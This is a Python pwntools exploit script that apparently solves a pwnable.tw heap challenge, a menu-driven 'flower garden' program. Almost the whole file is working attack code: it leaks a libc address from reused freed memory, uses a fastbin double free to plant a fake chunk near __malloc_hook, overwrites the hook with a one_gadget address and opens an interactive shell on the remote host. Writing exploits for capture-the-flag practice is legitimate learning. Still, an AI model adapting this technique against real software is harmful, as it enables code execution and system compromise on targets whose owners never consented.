#!/usr/bin/env python3
from pwn import *

p = remote("chall.pwnable.tw", "10203")

elf = ELF("./vuln")
libc = ELF("./libc.so.6")
# context.update(binary=elf, log_level='DEBUG')
# p = elf.process()
# gdb.attach(p, '''
# 	breakrva 0x10ba
# 	breakrva 0x10c6
# 	breakrva 0x10d2
# 	breakrva 0x10de
# ''')
# v0        - check flower is existing
# v0[1]     - name flower
# v0[2+3+4] - color flower // 24


def raiseFlower(length, name, color):
    p.sendlineafter(b"choice : ", b"1")
    print(p.recvuntil(b"name :"))
    p.sendline(str(int(length)).encode())
    print(p.recvuntil(b"flower :"))
    p.sendline(name)
    print(p.recvuntil(b"flower :"))
    p.sendline(color)
    return


def listFlower():
    p.sendlineafter(b"choice : ", b"2")
    return


def removeFlower(idx):
    p.sendlineafter(b"choice : ", b"3")
    print(p.recvuntil(b"garden:"))
    p.sendline(str(int(idx)).encode())
    return


def deleteGarden():
    p.sendlineafter(b"choice : ", b"4")
    return


############################ leak libc ###################################
# libc 2.23 not delete data (ptr manager, junk) when free and malloc again
# and printk use %s => meet NULL => stop.
raiseFlower(0x100, b"A" * 0x10, b"B" * 0x10)
raiseFlower(0x60, b"C" * 0x10, b"D" * 0x10)
raiseFlower(0x60, b"E" * 0x10, b"F" * 0x10)
raiseFlower(0x60, b"G" * 0x10, b"H" * 0x10)

removeFlower(0)
deleteGarden()
raiseFlower(0x100, b"A" * 0x7, b"B" * 0x10)
listFlower()
p.recvuntil(b"AAAAAAA\n")
leak = (p.recv(6)).ljust(8, b"\x00")
main_arena88 = u64(leak)
libc.address = main_arena88 - 88 - libc.symbols["main_arena"]
malloc_hook = libc.symbols["__malloc_hook"]
log.info("libc base address:      " + hex(libc.address))
log.info("&__malloc_hook address: " + hex(malloc_hook))

######################### trigger double free #############################
removeFlower(1)
removeFlower(2)
removeFlower(1)
deleteGarden()

fake_chunk = malloc_hook - 0x23  # junk
log.info("fake_chunk address: " + hex(fake_chunk))
raiseFlower(0x60, p64(fake_chunk), b"B" * 0x10)  #### value target
raiseFlower(0x60, b"A" * 0x7, b"B" * 0x10)
raiseFlower(0x60, b"A" * 0x7, b"B" * 0x10)

#### done trigger bug
one_gadget_offset = 0xEF6C4
one_gadget = libc.address + one_gadget_offset
log.info("One gadget : " + hex(one_gadget))
raiseFlower(0x60, b"A" * 0x13 + p64(one_gadget), b"B" * 0x10)

# trigger malloc_hook such that it satisfies the one gadget constrains
removeFlower(2)
removeFlower(2)
# interactive shell
p.interactive()
